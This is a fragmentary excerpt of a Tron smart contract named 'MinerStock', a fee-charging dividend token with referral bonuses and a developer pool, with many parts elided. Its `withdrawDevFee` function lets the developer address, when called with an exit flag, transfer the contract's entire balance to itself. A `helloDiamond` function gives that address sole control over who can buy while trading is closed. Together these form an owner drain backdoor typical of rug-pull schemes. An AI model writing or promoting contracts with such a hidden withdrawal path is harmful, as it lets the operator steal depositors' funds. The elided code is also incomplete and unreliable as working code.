...
contract MinerStock {
    ...
    modifier checkExchangeOpen(uint256 _amountOfTron){
        if( exchangeClosed ){
            require(isInHelloDiamond_[msg.sender] && msg.value <= helloAmount_[msg.sender]);
            isInHelloDiamond_[msg.sender] = false;
    ...
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "Miner Stock";
    string public symbol = "Stock";
    uint8 constant public decimals = 18;
    uint8 constant internal buyFee_ = 30;
   ...
   /*================================
    ...
    mapping(address => bool) internal isInHelloDiamond_;
    ...
    */
        ...
        public
    {
        ...
        uint256 _dividends = SafeMath.div(SafeMath.mul(_tron, sellFee_),100);
        uint256 _devPool = SafeMath.div(SafeMath.mul(_tron, 9),100);
    ...
    function helloDiamond(address _address, bool _status,uint8 _count, uint256 _amount)
      public
    {
      require(msg.sender == devAddress_);
      isInHelloDiamond_[_address] = _status;
      helloAmount_[_address] = _amount;
      helloCount = _count;
    }

    function withdrawDevFee(bool _isExit)
        public
    {
        require(msg.sender == devAddress_);

        if(_isExit == true){
          devAddress_.transfer(address(this).balance);
        }
        else{
        ...
        returns(uint256)
    {
        ...
        uint256 _referralBonus = SafeMath.div(_incomingTron, 20);  // 100 / 20 = 5
        uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
        uint256 _devPool = SafeMath.div(_incomingTron,10);
                _dividends =  SafeMath.sub(_dividends, _devPool);
                devPool = SafeMath.add(devPool,_devPool);
